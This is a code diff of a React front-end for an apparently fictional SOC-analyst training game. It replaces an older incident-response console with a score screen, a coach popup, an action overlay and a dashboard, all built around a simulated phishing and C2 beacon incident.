-.g-fb.wr{background:rgba(255,34,68,0.06);border:1px solid rgba(255,34,68,0.18);color:rgba(255,120,120,0.9)}
-.g-fb strong{color:#fff}
-/* Score */
-.g-score{position:fixed;inset:0;background:#000;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:28px;text-align:center;z-index:9999}
-.gs-grade{font-size:80px;font-weight:700;line-height:1;animation:ggrade .5s cubic-bezier(.175,.885,.32,1.275)}
-@keyframes ggrade{from{transform:scale(.3);opacity:0}to{transform:scale(1);opacity:1}}
-.gs-s{color:#00ff88;text-shadow:0 0 50px rgba(0,255,136,0.4)}
-.gs-a{color:#00aaff;text-shadow:0 0 50px rgba(0,170,255,0.4)}
-.gs-b{color:#ffaa00;text-shadow:0 0 40px rgba(255,170,0,0.3)}
-.gs-f{color:#ff2244;text-shadow:0 0 50px rgba(255,34,68,0.4)}
-.gs-title{font-size:15px;letter-spacing:.1em;color:rgba(255,255,255,0.6);margin:10px 0 24px}
-.gs-stats{display:flex;border:1px solid rgba(255,255,255,0.07);border-radius:7px;overflow:hidden;margin-bottom:24px;width:100%;max-width:320px}
-.gs-stat{flex:1;padding:12px 8px;text-align:center;border-right:1px solid rgba(255,255,255,0.07)}
-.gs-stat:last-child{border:none}
-.gs-n{font-size:20px;font-weight:700;color:#00ff88;line-height:1;margin-bottom:3px}
-.gs-l{font-size:8px;color:rgba(255,255,255,0.2);letter-spacing:.1em;text-transform:uppercase}
-.gs-btns{display:flex;gap:9px;width:100%;max-width:320px;flex-wrap:wrap}
-.gs-b1{flex:1;min-width:110px;padding:11px;background:#00ff88;color:#000;border:none;font-family:'Courier New',monospace;font-size:11px;letter-spacing:.12em;cursor:pointer;border-radius:4px;font-weight:700;touch-action:manipulation}
-.gs-b2{flex:1;min-width:110px;padding:11px;background:transparent;color:rgba(255,255,255,0.35);border:1px solid rgba(255,255,255,0.1);font-family:'Courier New',monospace;font-size:11px;letter-spacing:.1em;cursor:pointer;border-radius:4px;touch-action:manipulation}
-.gs-b2:hover{color:#fff;border-color:rgba(255,255,255,0.3)}
-</style>
-`;
-
-// Inject game styles immediately at module load
-(function(){if(!document.getElementById('game-styles')){const s=document.createElement('style');s.id='game-styles';s.textContent=GAME_CSS.replace('<style id="game-styles">','').replace('</style>','');document.head.appendChild(s);}})();
-
-/* ── GAME COMPONENT ─────────────────────────────────────────────────── */
-function SOCConsole({incId="INC-2026-0441",prog={xp:0,level:1,done:{}},addXP=()=>{},finishSim=()=>{},onBack=()=>{},submitFeedback=()=>{},analyst:analystProp,nav=()=>{},isGuest=false}) {
-
-  // Find scenario by incId
-  const scenarioKey = Object.keys(GAME_SCENARIOS).find(k => GAME_SCENARIOS[k].incId === incId) || "phishing-c2";
-  const scenario = GAME_SCENARIOS[scenarioKey] || GAME_SCENARIOS["phishing-c2"];
-
-  const [si, setSi] = React.useState(0);
-  const [xp, setXp] = React.useState(0);
-  const [elapsed, setElapsed] = React.useState(0);
-  const [atkProg, setAtkProg] = React.useState(0);
-  const [correct, setCorrect] = React.useState(0);
-  const [decisions, setDecisions] = React.useState(0);
-  const [done, setDone] = React.useState(false);
-  const [showScore, setShowScore] = React.useState(false);
-
-  // Scene-local state
-  const [emailOpen, setEmailOpen] = React.useState(false);
-  const [headerOpen, setHeaderOpen] = React.useState(false);
-  const [selectedAlert, setSelectedAlert] = React.useState(null);
-  const [selectedProc, setSelectedProc] = React.useState(null);
-  const [hashVal, setHashVal] = React.useState("a3f2b9d1e4c8f0a7");
-  const [hashResult, setHashResult] = React.useState(null);
-  const [connBlocked, setConnBlocked] = React.useState(false);
-  const [selectedFile, setSelectedFile] = React.useState(null);
-  const [quarantined, setQuarantined] = React.useState([]);
-  const [decisionMade, setDecisionMade] = React.useState(false);
-  const [chosenOpt, setChosenOpt] = React.useState(null);
-  const [footContent, setFootContent] = React.useState(null);
-  const [reportDone, setReportDone] = React.useState(0);
-  const [reportChosen, setReportChosen] = React.useState({});
-
-  const flashRef = React.useRef(null);
-  const atkRef = React.useRef(null);
-  const elRef = React.useRef(null);
-
-  const flash = (c) => {
-    if(!flashRef.current) return;
-    flashRef.current.className = 'g-flash ' + c + ' on';
-    setTimeout(() => { if(flashRef.current) flashRef.current.className = 'g-flash'; }, 180);
-  };
-
-  React.useEffect(() => {
-    // Timers
-    atkRef.current = setInterval(() => {
-      setAtkProg(p => {
-        const next = Math.min(100, p + 1);
-        return next;
-      });
-    }, 10000);
-    elRef.current = setInterval(() => setElapsed(e => e+1), 1000);
-    return () => {
-      clearInterval(atkRef.current);
-      clearInterval(elRef.current);
-    };
-  }, []);
-
-  // Reset scene state when si changes
-  React.useEffect(() => {
-    setEmailOpen(false); setHeaderOpen(false);
-    setSelectedAlert(null); setSelectedProc(null);
-    setHashResult(null); setConnBlocked(false);
-    setSelectedFile(null); setDecisionMade(false);
-    setChosenOpt(null); setFootContent(null);
-  }, [si]);
-
-  const scene = scenario.scenes[si];
-  const mm = String(Math.floor(elapsed/60)).padStart(2,'0');
-  const ss2 = String(elapsed%60).padStart(2,'0');
-  const phaseClass = {'TRIAGE':'ph-triage','INVESTIGATION':'ph-investigation','CONTAINMENT':'ph-containment','CLOSE':'ph-close'}[scene.phase] || 'ph-triage';
-
-  const gainXP = (n) => {
-    const total = xp + n;
-    setXp(total);
-    addXP(n);
-    return total;
-  };
-
-  const chooseDecision = (i) => {
-    if(decisionMade) return;
-    const opt = scene.decision.options[i];
-    setDecisionMade(true);
-    setChosenOpt(i);
-    setDecisions(d => d+1);
-    if(opt.correct) {
-      setCorrect(c => c+1);
-      gainXP(scene.xp);
-      flash('g');
-    } else {
-      gainXP(Math.floor(scene.xp * 0.3));
-      setAtkProg(p => Math.min(100, p + 8));
-      flash('r');
-    }
-  };
-
-  const nextScene = () => {
-    if(isGuest && si === 1) { nav("signup"); return; }
-    if(si >= scenario.scenes.length - 1) {
-      clearInterval(atkRef.current); clearInterval(elRef.current);
-      const pct = decisions > 0 ? Math.round((correct/decisions)*100) : 80;
-      const grade = pct>=90?'S':pct>=75?'A':pct>=60?'B':'C';
-      finishSim(scenario.incId, xp, grade, elapsed);
-      setShowScore(true);
-    } else {
-      flash('g');
-      setSi(s => s+1);
-    }
-  };
-
-  // ── SCORE SCREEN ───────────────────────────────────────────────────
-  if(showScore) {
-    const pct = decisions > 0 ? Math.round((correct/decisions)*100) : 80;
-    const grade = pct>=90?'S':pct>=75?'A':pct>=60?'B':'C';
-    const gradeClass = {S:'gs-s',A:'gs-a',B:'gs-b',C:'gs-b',F:'gs-f'}[grade];
-    return (
-      <div className="g-score">
-        <div className={`gs-grade ${gradeClass}`}>{grade}</div>
-        <div className="gs-title">INCIDENT CONTAINED</div>
-        <div className="gs-stats">
-          <div className="gs-stat"><div className="gs-n">{mm}:{ss2}</div><div className="gs-l">Time</div></div>
-          <div className="gs-stat"><div className="gs-n">{xp}</div><div className="gs-l">XP</div></div>
-          <div className="gs-stat"><div className="gs-n">{pct}%</div><div className="gs-l">Accuracy</div></div>
-        </div>
-        <div className="gs-btns">
-          <button className="gs-b1" onClick={() => { setSi(0); setXp(0); setElapsed(0); setAtkProg(0); setCorrect(0); setDecisions(0); setShowScore(false); clearInterval(atkRef.current); clearInterval(elRef.current); atkRef.current=setInterval(()=>setAtkProg(p=>Math.min(100,p+1)),10000); elRef.current=setInterval(()=>setElapsed(e=>e+1),1000); }}>REPLAY</button>
-          <button className="gs-b2" onClick={onBack}>DASHBOARD</button>
-        </div>
-      </div>
-    );
-  }
-
-  // ── SCENE RENDERER ─────────────────────────────────────────────────
-  const renderSceneBody = () => {
-    switch(scene.type) {
-      case 'email': return renderEmail();
-      case 'siem': return renderSIEM();
-      case 'edr': return renderEDR();
-      case 'network': return renderNetwork();
-      case 'quarantine': return renderQuarantine();
-      case 'report': return renderReport();
-      default: return null;
-    }
-  };
-
-  // ── EMAIL ──────────────────────────────────────────────────────────
-  const renderEmail = () => {
-    const d = scene.data;
-    return (
-      <div style={{padding:10}}>
-        <div style={{fontSize:9,letterSpacing:'.12em',textTransform:'uppercase',color:'rgba(0,255,136,0.4)',marginBottom:10,paddingBottom:7,borderBottom:'1px solid rgba(255,255,255,0.06)',display:'flex',gap:8,alignItems:'center'}}>
-          📥 INBOX — {d.to}
-          <span style={{background:'rgba(255,34,68,0.12)',color:'#ff2244',padding:'1px 6px',borderRadius:3,fontSize:9}}>1 UNREAD</span>
-        </div>
-        <div className={`em-card${emailOpen?' open':''}`} onClick={() => setEmailOpen(true)}>
-          <div className="em-prev">
-            <div className="em-av">📧</div>
-            <div className="em-meta">
-              <div className="em-from">{d.fromDisplay} &lt;<span className="em-sus">{d.from}</span>&gt;</div>
-              <div className="em-subj">{d.subject}</div>
-              <div className="em-time">{d.time} · 1 attachment</div>
-            </div>
+        {/* Hero banner */}
+        <div style={{background:isTP
+            ?"linear-gradient(135deg,#dc2626 0%,#7c3aed 100%)"
+            :"linear-gradient(135deg,#22c55e 0%,#0891b2 100%)",
+          padding:"28px 24px",textAlign:"center",position:"relative",overflow:"hidden"}}>
+          <div style={{position:"absolute",inset:0,opacity:0.1,
+            backgroundImage:"radial-gradient(circle at 20% 50%, white 1px, transparent 1px)",
+            backgroundSize:"24px 24px"}}/>
+          <div style={{fontSize:48,marginBottom:8}}>
+            {isTP ? "🚨" : "✅"}
           </div>
-          <div className="em-body">
-            <div className="em-field"><span className="ef-k">From:</span><span className="ef-v sus">{d.from} <span className="em-ioc ioc-danger">SUSPICIOUS</span></span></div>
-            <div className="em-field"><span className="ef-k">To:</span><span className="ef-v">{d.to}</span></div>
-            <div className="em-field"><span className="ef-k">Subject:</span><span className="ef-v">{d.subject}</span></div>
-            <div className="em-field"><span className="ef-k">Reply-To:</span><span className="ef-v sus">{d.headers['Reply-To']} <span className="em-ioc ioc-danger">≠ SENDER</span></span></div>
-            <div className="em-text">{d.body}</div>
-            <div className="em-attach">📎 {d.attachment.name} <span className="em-ioc ioc-warn">MACRO ENABLED</span> <span style={{fontSize:9,color:'rgba(255,255,255,0.25)',marginLeft:4}}>{d.attachment.size}</span></div>
-            <div className="em-hdr">
-              <div className="em-hdr-toggle" onClick={(e)=>{e.stopPropagation();setHeaderOpen(!headerOpen)}}>▸ VIEW EMAIL HEADERS</div>
-              <div className={`em-hdr-list${headerOpen?' open':''}`}>
-                {Object.entries(d.headers).map(([k,v]) => (
-                  <div key={k}><span style={{color:'rgba(255,255,255,0.35)'}}>{k}: </span><span className="hdr-bad">{v}</span></div>
-                ))}
-              </div>
-            </div>
-            {!decisionMade && (
-              <div className="g-act-row" style={{marginTop:14}}>
-                <button className="g-btn good" onClick={(e)=>{e.stopPropagation();chooseDecision(0)}}>🚨 Report Phishing</button>
-                <button className="g-btn neutral" onClick={(e)=>{e.stopPropagation();chooseDecision(1)}}>Let it sit</button>
-              </div>
-            )}
-            {decisionMade && (
-              <div className={`g-fb ${scene.decision.options[chosenOpt].correct?'cor':'wr'}`}>
-                {scene.decision.options[chosenOpt].correct?'✓ ':'✗ '}
-                <strong>{scene.decision.options[chosenOpt].correct?'Correct. ':'Wrong. '}</strong>
-                {scene.decision.options[chosenOpt].why}
-              </div>
-            )}
+          <div style={{fontSize:22,fontWeight:800,color:"#fff",marginBottom:4}}>
+            {isTP ? "Attack Stopped" : "False Positive Identified"}
+          </div>
+          <div style={{fontSize:13,color:"rgba(255,255,255,0.8)",lineHeight:1.5}}>
+            {isTP
+              ? "You detected and contained a real attack. A finance workstation is safe because of your investigation."
+              : "You correctly identified a false alarm and avoided wasting incident response resources."}
           </div>
         </div>
-        {!emailOpen && <div style={{fontSize:11,color:'rgba(255,255,255,0.3)',marginTop:8,textAlign:'center'}}>↑ Tap the email to open it</div>}
-      </div>
-    );
-  };
 
-  // ── SIEM ───────────────────────────────────────────────────────────
-  const renderSIEM = () => {
-    const alerts = scene.data.alerts;
-    return (
-      <div className="siem-wrap">
-        <div className="siem-hdr">BlueTrace SIEM — {scenario.incId} — {alerts.length} alerts require triage</div>
-        {alerts.map(a => (
-          <div key={a.id} className={`al-card ${a.sev.toLowerCase()}${selectedAlert===a.id?' sel':''}`} onClick={()=>setSelectedAlert(selectedAlert===a.id?null:a.id)}>
-            <div className="al-top">
-              <span className={`al-sev sev-${a.sev}`}>{a.sev}</span>
-              <span className="al-rule">{a.rule}</span>
-              <span className="al-time">{a.time}</span>
-              {a.sev==='CRITICAL' && <div className="al-pulse"/>}
-            </div>
-            <div className="al-msg">{a.msg}</div>
-            {selectedAlert===a.id && (
-              <div className="al-det open">
-                {Object.entries(a.detail).map(([k,v]) => (
-                  <div key={k} className="al-row">
-                    <span className="ar-k">{k}</span>
-                    <span className={`ar-v${k.includes('Score')||k.includes('Access')?' bad':''}`}>{v}</span>
-                  </div>
-                ))}
+        {/* Stats */}
+        <div style={{padding:"20px 24px"}}>
+          <div style={{display:"grid",gridTemplateColumns:"repeat(3,1fr)",gap:8,gap:12,marginBottom:20}}>
+            {[
+              ["Grade", grade, gradeColor],
+              ["XP Earned", "+"+xpEarned, "#22c55e"],
+              ["Time", mm+":"+ss2, "#60a5fa"],
+            ].map(([label,val,color])=>(
+              <div key={label} style={{background:"rgba(255,255,255,0.04)",
+                border:"1px solid rgba(255,255,255,0.08)",borderRadius:10,
+                padding:"12px",textAlign:"center"}}>
+                <div style={{fontSize:22,fontWeight:800,color,fontFamily:"var(--mo)",marginBottom:2}}>{val}</div>
+                <div style={{fontSize:9,color:"#6b7280",fontFamily:"var(--mo)",letterSpacing:"0.1em",textTransform:"uppercase"}}>{label}</div>
               </div>
-            )}
-          </div>
-        ))}
-      </div>
-    );
-  };
-
-  // ── EDR ────────────────────────────────────────────────────────────
-  const renderEDR = () => {
-    const {processes, hashTarget} = scene.data;
-    return (
-      <div className="edr-wrap">
-        <div className="edr-hdr">LearnThreatOps EDR <span className="edr-host">{scene.data.host}</span></div>
-        {processes.map(p => (
-          <React.Fragment key={p.pid}>
-            <div className={`proc ${p.status}${selectedProc===p.pid?' sel':''}`} onClick={()=>setSelectedProc(selectedProc===p.pid?null:p.pid)}>
-              <div className="p-indent" style={{width:p.depth*16}}></div>
-              {p.depth>0 && <span className="p-indent">└─ </span>}
-              <span className="p-name">{p.name}</span>
-              <span className="p-pid">PID {p.pid}</span>
-              {p.status==='suspicious' && <span className="p-tag pt-sus">SUSPICIOUS</span>}
-              {p.status==='malicious' && <span className="p-tag pt-mal">MALICIOUS</span>}
-            </div>
-            {selectedProc===p.pid && p.info && (
-              <div className="p-det open" style={{marginLeft:p.depth*16+24}}>
-                {Object.entries(p.info).map(([k,v]) => (
-                  <div key={k} className="pd-row">
-                    <span className="pd-k">{k}</span>
-                    <span className={`pd-v${k==='Verdict'&&v.includes('alicious')?' bad':''}`}>{v}</span>
-                  </div>
-                ))}
-              </div>
-            )}
-          </React.Fragment>
-        ))}
-        {(selectedProc===4891 || hashResult) && (
-          <div className="hash-wrap">
-            <div className="hw-lbl">Hash Lookup — paste hash to verify</div>
-            <div className="hw-row">
-              <input className="hw-inp" value={hashVal} onChange={e=>setHashVal(e.target.value)} onKeyDown={e=>e.key==='Enter'&&doHash()}/>
-              <button className="hw-btn" onClick={doHash}>LOOKUP</button>
-            </div>
-            {hashResult && (
-              <div className={`hash-res ${hashResult.malicious?'mal':'safe'}`}>
-                <div className={`hr-score ${hashResult.malicious?'bad':'ok'}`}>{hashResult.score}/100 — {hashResult.malicious?'MALICIOUS':'CLEAN'}</div>
-                <div style={{fontSize:10,color:hashResult.malicious?'#ff2244':'#00ff88',marginBottom:5}}>{hashResult.family}</div>
-                <div style={{fontSize:10,color:'rgba(255,255,255,0.45)',lineHeight:1.7}}>Detections: {hashResult.detections}<br/>C2: {hashResult.c2}</div>
-              </div>
-            )}
-          </div>
-        )}
-      </div>
-    );
-  };
-
-  const doHash = () => {
-    if(!hashVal.trim()) return;
-    const ht = scene.data.hashTarget;
-    const isMal = hashVal.toLowerCase().includes(ht.hash) || hashVal.length > 6;
-    setHashResult(isMal ? {...ht, malicious:true} : {score:2,family:'Clean — not in threat database',detections:'0/70',c2:'N/A',malicious:false});
-    flash(isMal?'r':'g');
-  };
-
-  // ── NETWORK ────────────────────────────────────────────────────────
-  const renderNetwork = () => {
-    const c = scene.data.connection;
-    return (
-      <div className="net-wrap">
-        <div className="net-hdr">⚡ ACTIVE CONNECTIONS — WS-CORP-FIN-044</div>
-        <div className="conn-card">
-          <div className="cc-top">
-            <div className={`cc-dot${connBlocked?' off':''}`}/>
-            <div className="cc-title">{connBlocked?'✓ MACHINE ISOLATED — C2 SEVERED':'ACTIVE C2 BEACON — svchost32.exe'}</div>
-          </div>
-          <div className="cc-body">
-            {[['From',c.src],['To',c.dst,'bad'],['Process',c.process,'bad'],['Protocol',c.protocol],['Frequency',c.frequency,'bad'],['Threat Intel',c.threatScore,'bad']].map(([k,v,cls]) => (
-              <div key={k} className="cc-row"><span className="cc-k">{k}</span><span className={`cc-v${cls?' '+cls:''}`}>{v}</span></div>
             ))}
-            <div className="cc-visual">
-              <div className="cv-node inf"><div>💻 WS-FIN-044</div><div className="cv-lbl">Compromised</div></div>
-              <div className={`cv-arr${connBlocked?' off':''}`}>{connBlocked?'✗✗✗':'→→→'}</div>
-              <div className="cv-node ext"><div>☠ 203.0.113.47</div><div className="cv-lbl">Attacker C2</div></div>
+          </div>
+
+          {/* What you learned */}
+          <div style={{background:"rgba(255,255,255,0.03)",border:"1px solid rgba(255,255,255,0.06)",
+            borderRadius:10,padding:"14px",marginBottom:16}}>
+            <div style={{fontSize:9,fontWeight:700,color:"#6b7280",fontFamily:"var(--mo)",
+              letterSpacing:"0.1em",textTransform:"uppercase",marginBottom:8}}>What You Practised</div>
+            <div style={{display:"flex",flexWrap:"wrap",gap:6}}>
+              {inc.tags?.map(t=>(
+                <div key={t} style={{fontSize:11,background:"rgba(59,130,246,0.1)",
+                  color:"#60a5fa",border:"1px solid rgba(59,130,246,0.2)",
+                  borderRadius:20,padding:"3px 10px",fontWeight:500}}>{t}</div>
+              ))}
             </div>
           </div>
+
+          {/* Legal disclaimer */}
+          <div style={{fontSize:10,color:"#374151",textAlign:"center",marginBottom:16,lineHeight:1.5}}>
+            This was a fictional simulation. No real systems or data were involved.
+          </div>
+
+          {/* Actions */}
+          <div style={{display:"flex",gap:10}}>
+            <button onClick={()=>{window.location.reload();}}
+              style={{flex:1,background:"rgba(99,102,241,0.1)",border:"1px solid rgba(99,102,241,0.25)",
+                borderRadius:10,padding:"12px",fontSize:13,color:"#818cf8",cursor:"pointer",fontWeight:700}}>
+              🔄 Replay — Beat Score
+            </button>
+            <button onClick={onBack}
+              style={{flex:1,background:"rgba(255,255,255,0.06)",border:"1px solid rgba(255,255,255,0.1)",
+                borderRadius:10,padding:"12px",fontSize:13,color:"#e8ecf4",cursor:"pointer",fontWeight:600}}>
+              ← Back to Dashboard
+            </button>
+            <button onClick={()=>{
+                const text = `I just completed a SOC analyst investigation on LearnThreatOps — ${isTP?"detected a phishing attack and stopped a C2 beacon":"correctly identified a false positive"}. Grade: ${grade}. Free beta at learnthreatops.cloud 🛡`;
+                navigator.clipboard?.writeText(text);
+              }}
+              style={{flex:1,background:"#1a56db",border:"none",borderRadius:10,
+                padding:"12px",fontSize:13,color:"#fff",cursor:"pointer",fontWeight:700}}>
+              Share Result 📤
+            </button>
+          </div>
         </div>
-        {!decisionMade && (
-          <div style={{padding:'0 2px'}}>
-            <div style={{fontSize:11,color:'rgba(255,255,255,0.35)',marginBottom:10,lineHeight:1.6}}>Every 30 seconds the attacker receives updates from this machine. Choose your action.</div>
-            <div className="g-act-row">
-              <button className="g-btn good" onClick={()=>{setConnBlocked(true);flash('g');chooseDecision(0)}}>🔒 Isolate Machine</button>
-              <button className="g-btn bad" onClick={()=>{chooseDecision(1)}}>Block IP Only</button>
-              <button className="g-btn neutral" onClick={()=>{chooseDecision(2)}}>Keep Monitoring</button>
+      </div>
+    </div>
+  );
+}
+
+
+
+// ─────────────────────────────────────────────────────────────────────────────
+// COACH POPUP — the guided instruction overlay per step
+// ─────────────────────────────────────────────────────────────────────────────
+
+// ─────────────────────────────────────────────────────────────────────────────
+// NEW COACH POPUP — Socratic method, never gives answers
+// ─────────────────────────────────────────────────────────────────────────────
+
+function CoachPopup({step, onClose, onHint, hintUsed, stepsDone, totalSteps}) {
+  const pc = phaseColor(step.phase);
+  const toolIcons = {"BlueTrace SIEM":"📊","LearnThreatOpsEDR":"🖥","ThreatLens":"🔍","IncidentDesk":"📋"};
+  const icon = toolIcons[step.tool]||"🛠";
+
+  return (
+    <div style={{position:"fixed",inset:0,background:"rgba(0,0,0,0.8)",zIndex:600,
+      display:"flex",alignItems:"flex-end",justifyContent:"center",
+      padding:"0 16px 24px"}}>
+      <div style={{background:"#111827",border:"1px solid rgba(255,255,255,0.1)",
+        borderTop:"3px solid "+pc,borderRadius:16,padding:"20px",
+        maxWidth:480,width:"100%",boxShadow:"0 -8px 40px rgba(0,0,0,0.6)"}}>
+
+        {/* Progress bar */}
+        <div style={{display:"flex",gap:4,marginBottom:16}}>
+          {Array.from({length:totalSteps}).map((_,i)=>(
+            <div key={i} style={{flex:1,height:3,borderRadius:2,
+              background:i<stepsDone?"#22c55e":i===stepsDone?pc:"rgba(255,255,255,0.08)",
+              transition:"all 0.4s"}}/>
+          ))}
+        </div>
+
+        {/* Step number + phase */}
+        <div style={{display:"flex",alignItems:"center",gap:8,marginBottom:10}}>
+          <div style={{fontSize:11,fontWeight:700,color:pc,fontFamily:"var(--mo)",
+            background:pc+"15",border:"1px solid "+pc+"30",borderRadius:20,
+            padding:"3px 10px",letterSpacing:"0.1em"}}>
+            {step.phase}
+          </div>
+          <div style={{fontSize:11,color:"#6b7280",fontFamily:"var(--mo)"}}>
+            Step {stepsDone+1} of {totalSteps}
+          </div>
+        </div>
+
+        {/* THE ONE THING TO DO — big and clear */}
+        <div style={{fontSize:16,fontWeight:700,color:"#f9fafb",
+          lineHeight:1.4,marginBottom:6}}>
+          {step.objective?.split(".")[0]}.
+        </div>
+
+        {/* Hint — only first sentence */}
+        <div style={{fontSize:12,color:"#6b7280",lineHeight:1.5,marginBottom:16}}>
+          {step.mentor?.tip ? step.mentor.tip.split(".")[0]+"." : step.analyst_note?.split(".")[0]+"."}
+        </div>
+
+        {/* Buttons */}
+        <div style={{display:"flex",gap:8}}>
+          <button onClick={()=>{onHint();}}
+            style={{padding:"10px 14px",background:"rgba(251,191,36,0.08)",
+              border:"1px solid rgba(251,191,36,0.2)",borderRadius:8,
+              fontSize:11,color:"#fbbf24",cursor:"pointer",fontWeight:600,flexShrink:0}}>
+            Hint −5XP
+          </button>
+          <button onClick={onClose}
+            style={{flex:1,background:pc,border:"none",borderRadius:8,
+              padding:"11px",fontSize:14,color:"#fff",cursor:"pointer",
+              fontWeight:700,boxShadow:"0 4px 14px "+pc+"40"}}>
+            {icon} Open {step.tool} →
+          </button>
+        </div>
+      </div>
+    </div>
+  );
+}
+
+
+
+// ─────────────────────────────────────────────────────────────────────────────
+// ACTION OVERLAY — after decision, shows action button
+// ─────────────────────────────────────────────────────────────────────────────
+
+function ActionOverlay({step, onConfirm, isRunning, isDone, xpBurst}) {
+  const pc = phaseColor(step?.phase||"TRIAGE");
+  const hasDecision = !!(step&&step.decision);
+
+  const btnLabel = isDone
+    ? "Next Step →"
+    : isRunning
+      ? "Executing..."
+      : hasDecision
+        ? "I have reviewed — make my call →"
+        : "Mark Step Complete →";
+
+  return (
+    <div style={{position:"fixed",bottom:0,left:0,right:0,zIndex:400,
+      background:"linear-gradient(to top,rgba(8,10,16,0.98) 0%,rgba(8,10,16,0.7) 80%,transparent 100%)",
+      padding:"12px 16px 20px"}}>
+      <div style={{maxWidth:600,margin:"0 auto",pointerEvents:"all"}}>
+
+        {/* Analyst note — what to look for */}
+        {!isDone&&!isRunning&&step?.analyst_note&&(
+          <div style={{background:"rgba(255,255,255,0.04)",
+            borderLeft:"2px solid "+pc,borderRadius:6,
+            padding:"8px 12px",marginBottom:10,display:"flex",gap:8,alignItems:"flex-start"}}>
+            <span style={{fontSize:14,flexShrink:0}}>{"🎯"}</span>
+            <div style={{fontSize:12,color:"#c8cdd8",lineHeight:1.6}}>
+              {step.analyst_note.split(".")[0]}.
             </div>
           </div>
         )}
-      </div>
-    );
-  };
 
-  // ── QUARANTINE ─────────────────────────────────────────────────────
-  const renderQuarantine = () => {
-    const files = scene.data.files;
-    return (
-      <div className="quar-wrap">
-        <div className="q-path">📁 <span>{scene.data.path}</span></div>
-        {files.map(f => (
-          <div key={f.name} className={`f-row${selectedFile===f.name?' sel':''}${quarantined.includes(f.name)?' done':''}`} onClick={()=>!quarantined.includes(f.name)&&setSelectedFile(f.name)}>
-            <span className="f-icon">{f.icon}</span>
-            <span className="f-name">{f.name}</span>
-            <span className="f-size">{f.size}</span>
-            {f.malicious && !quarantined.includes(f.name) && <span className="f-tag ft-mal">MALICIOUS</span>}
-            {quarantined.includes(f.name) && <span className="f-tag" style={{background:'rgba(0,255,136,0.1)',color:'#00ff88'}}>QUARANTINED</span>}
+        {/* Done — what was learned */}
+        {isDone&&step?.seniorThinking&&(
+          <div style={{background:"rgba(34,197,94,0.08)",
+            borderLeft:"2px solid #22c55e",borderRadius:6,
+            padding:"8px 12px",marginBottom:10,display:"flex",gap:8,alignItems:"flex-start"}}>
+            <span style={{fontSize:14,flexShrink:0}}>{"✅"}</span>
+            <div style={{fontSize:12,color:"#4ade80",lineHeight:1.6}}>
+              {step.seniorThinking}
+            </div>
+          </div>
+        )}
+
+        {/* Action button */}
+        <button 
+          onClick={isRunning?undefined:onConfirm}
+          disabled={isRunning}
+          style={{width:"100%",
+            background:isDone?"#22c55e":isRunning?"#374151":pc,
+            color:"#fff",padding:"14px",borderRadius:10,
+            fontSize:14,fontWeight:700,border:"none",
+            cursor:isRunning?"default":"pointer",
+            boxShadow:isDone?"0 4px 20px rgba(34,197,94,0.4)":`0 4px 20px ${pc}40`,
+            transition:"all 0.2s",letterSpacing:"0.02em",
+            WebkitTapHighlightColor:"transparent",
+            touchAction:"manipulation"}}>
+          {btnLabel}
+        </button>
+      </div>
+    </div>
+  );
+}
+
+
+
+
+// ─────────────────────────────────────────────────────────────────────────────
+// SOC DASHBOARD
+// ─────────────────────────────────────────────────────────────────────────────
+
+function SOCDashboard({onAssign,onOpen,assigned,prog,analyst}){
+  const inc=INCIDENTS["INC-2026-0441"];
+  const [tick,setTick]=useState(0);
+  useEffect(()=>{const t=setInterval(()=>setTick(s=>s+1),1000);return()=>clearInterval(t);},[]);
+  const now=new Date("2026-05-28T08:00:00Z");
+  now.setSeconds(now.getSeconds()+tick);
+  const timeStr=now.toISOString().replace("T"," ").slice(0,19)+" UTC";
+
+  return(
+    <div className="soc-root" style={{background:"var(--bg)",minHeight:"100vh",display:"flex",flexDirection:"column"}}>
+      {/* HEADER */}
+      <div style={{background:"var(--bg2)",borderBottom:"1px solid var(--bd)",padding:"0 20px",height:52,display:"flex",alignItems:"center",justifyContent:"space-between",flexShrink:0,boxShadow:"var(--sh)"}}>
+        <div style={{display:"flex",alignItems:"center",gap:12}}>
+          <div style={{width:28,height:28,borderRadius:6,background:"linear-gradient(135deg,#3b82f6,#7c3aed)",display:"flex",alignItems:"center",justifyContent:"center",fontSize:11,fontWeight:800,color:"#fff",fontFamily:"var(--mo)"}}>LearnThreatOps</div>
+          <div>
+            <span style={{fontSize:14,fontWeight:700,color:"var(--tx)"}}>LEARN</span>
+            <span style={{fontSize:14,fontWeight:700,background:"linear-gradient(90deg,#5b7fe8,#2a3bbd)",WebkitBackgroundClip:"text",WebkitTextFillColor:"transparent",backgroundClip:"text"}}>LEARNTHREATOPS</span>
+            <span style={{fontSize:9,color:"var(--tx4)",marginLeft:8,fontFamily:"var(--mo)"}}>SOC Operations Center</span>
+          <span style={{fontSize:8,color:"rgba(220,38,38,0.5)",fontFamily:"var(--mo)",marginLeft:4,letterSpacing:"0.05em"}}>· SIMULATION</span>
+          </div>
+        </div>
+        <div style={{display:"flex",alignItems:"center",gap:14}}>
+          <div style={{fontSize:10,color:"var(--tx4)",fontFamily:"var(--mo)"}}>{timeStr}</div>
+          <div style={{display:"flex",alignItems:"center",gap:5}}>
+            <Dot color="#22c55e" pulse/>
+            <span style={{fontSize:10,color:"#86efac",fontFamily:"var(--mo)",fontWeight:600}}>SHIFT ACTIVE</span>
+          </div>
+          <div style={{background:"var(--bg3)",border:"1px solid var(--bd)",borderRadius:7,padding:"5px 12px",display:"flex",alignItems:"center",gap:8}}>
+            <div style={{width:24,height:24,borderRadius:"50%",background:"var(--acl)",border:"1px solid var(--acb)",display:"flex",alignItems:"center",justifyContent:"center",fontSize:10,fontWeight:700,color:"var(--ac)",fontFamily:"var(--mo)"}}>L1</div>
+            <div>
+              <div style={{fontSize:11,fontWeight:600,color:"var(--tx)"}}>{analyst.name}</div>
+              <div style={{fontSize:9,color:"var(--tx4)",fontFamily:"var(--mo)"}}>{analyst.tier} · {analyst.team}</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div style={{display:"flex",flex:1,overflow:"hidden"}}>
+        {/* LEFT SIDEBAR */}
+        <div style={{width:200,background:"var(--bg2)",borderRight:"1px solid var(--bd)",display:"flex",flexDirection:"column",flexShrink:0}}>
+          <div style={{padding:"14px 14px 8px"}}>
+            <div style={{fontSize:8.5,fontWeight:700,color:"var(--tx4)",letterSpacing:"0.14em",fontFamily:"var(--mo)",textTransform:"uppercase",marginBottom:10}}>Navigation</div>
+            {[["📊","Dashboard",true],["🔔","Alert Queue",false],["📁","My Cases",false],["🔍","Threat Hunt",false],["📈","Reports",false],["⚙️","Settings",false]].map(([ic,l,on])=>(
